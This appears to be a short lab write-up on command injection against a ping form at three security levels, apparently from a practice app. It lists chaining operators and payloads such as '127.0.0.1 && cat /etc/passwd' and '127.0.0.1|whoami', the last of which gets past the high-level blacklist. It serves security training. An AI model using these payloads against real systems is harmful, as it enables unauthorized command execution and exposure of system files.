# Command Injection Attack 

## What is Command Injection Attack

it happens when an application lets user input get executed as system commands.

This allows an attacker to run unintended commands on the server, often leading to full system compromise.

---

## LOW Level

This functionality is used to ping a device to check if it is reachable.

<img width="933" height="423" alt="Screenshot from 2026-01-27 20-06-33" src="https://github.com/user-attachments/assets/7b8492d1-79d9-43dc-89ac-4afc94fc7185" />


### Injection Examples

we can inject something like:
```
127.0.0.1 && whoami
127.0.0.1 && cat /etc/passwd
```

<img width="933" height="423" alt="Screenshot from 2026-01-27 20-08-04" src="https://github.com/user-attachments/assets/22eb615f-4183-4585-ab6b-95d8ca54ed51" />


we can use : &&  &  ||  | ,  ; 

---

## MEDIUM Level

they forgot to sanitize the pipe |

### Exploit
```
127.0.0.1 | cat /etc/passwd
```

<img width="944" height="726" alt="Screenshot from 2026-01-27 20-18-42" src="https://github.com/user-attachments/assets/debe4bf6-42c8-4bfa-a841-ee7894416cad" />


---

## High Level

The blacklist only removes "| " (pipe + space), not "|" alone

<img width="773" height="613" alt="Screenshot from 2026-01-27 20-19-34" src="https://github.com/user-attachments/assets/7b3b36c4-730f-4ee7-823e-501e652a548e" />


### Exploit

so: 127.0.0.1|whoami is still working

<img width="944" height="726" alt="Screenshot from 2026-01-27 20-18-11" src="https://github.com/user-attachments/assets/1b729de2-f903-4276-8df4-112cf7e7c299" />
